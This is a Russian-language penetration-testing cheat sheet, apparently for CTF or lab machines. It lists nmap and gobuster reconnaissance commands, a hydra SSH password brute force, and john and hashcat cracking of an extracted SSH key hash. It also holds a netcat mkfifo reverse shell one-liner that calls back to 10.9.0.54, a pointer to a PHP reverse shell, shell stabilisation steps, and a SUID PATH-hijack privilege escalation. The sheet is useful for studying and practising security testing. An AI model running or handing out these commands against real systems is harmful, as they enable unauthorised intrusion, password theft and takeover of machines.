#nmap

Сканирование сети:

`nmap -sn 172.16.0.0/16`

Сканирование портов Xmas:

`sudo nmap -p1-999 -sX -Pn --stats-every 30s -vv 10s 10.10.244.209`

Сканирование портов tcp SYN:

`sudo nmap -p1-5000 -sS -Pn --stats-every 30s -vv 10s 10.10.244.209`

**Скрипты**

Сканирование стандартными скриптами:

```
sudo nmap -sC -sV -oN nmap/rootme <IP>
-sC : Default scripts
-sV : Version detection
-oN : Output to be stored in the directory ‘nmap’
```

Справка по скрипту

`nmap --script-help <script-name>`

Поиск установленных скриптов:

`grep "ftp" /usr/share/nmap/scripts/script.db`

Установка скрипта:

`sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse`

`nmap --script-updatedb`

Проверка анонимного FTP логина:

`sudo nmap --script=ftp-anon -p21 10.10.200.205 -vv -Pn`

Проверка SMB:
`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>`

RPC:

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.38.0`

#gobuster

Сканирование директорий:

```
gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt
-x .php - для указаня расширения
```

#SSH

Перебор паролей SSH:

`sudo hydra -P /usr/share/wordlists/rockyou.txt -l <username> ssh://<IP>`


#Passwords

Поиск хеша

`hash-identifier`

Извлечение хеша из SSH ключа:

`ssh2john kay_id_rsa > kay_id_rsa.hash`

Подбор пароля john:

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt kay_id_rsa.hash`

hashcat:

`./hashcat -a 0 -m 1600 --show <file_with_hash> /usr/share/wordlists/rockyou.txt`

#PHP

Reverse shell

```commandline
Скрипт по адресу:
https://github.com/pentestmonkey/php-reverse-shell

Указываем в крипте ip и порт и запускаем прослушивание:
nc -lvnp 9001

Далее запускаем скрипт на удаленной машине.

Для создания стабильного shell:
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo
fg
export TERM=xterm
```

#Privilege escalation (эскалация привилегий)

Страница со сборником скриптов:

`https://gtfobins.github.io/`

#Reverse Shell

Указываем в крипте ip и порт и запускаем прослушивание:
`nc -lvnp 9001`

Стабилизация консоли:
```commandline
python -c "import pty; pty.spawn('/bin/bash')"
ruby -e "exec '/bin/bash'"
perl -e "exec '/bin/bash';"

^Z
stty raw -echo && fg
export TERM=xterm-256-color
```

Запуск простого http сервера:
`sudo python -m http.server 80`

Shells:

```commandline
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.54 1234 >/tmp/f
```

#Скрытые разделы в файла

Поиск уязвимостей:

`https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS`

Поиск запускаемых заданий:

`https://github.com/DominicBreuker/pspy`

Поиск скрытых директорий:

`binwalk <file_path>`

Извлечение скрытых файлов:

```
binwalk <file_path> -e
или
steghide extract -sf <file_path>
```

Поиск файлов SUID:

`find / -perm -u=s -type f 2>/dev/null`

Вариант повышения привилегий через файл SUID:

```commandline
echo /bin/sh > /tmp/curl
chmod 777 /tmp/curl
cd /tmp
export PATH=/tmp:$PATH
/usr/bin/menu
```
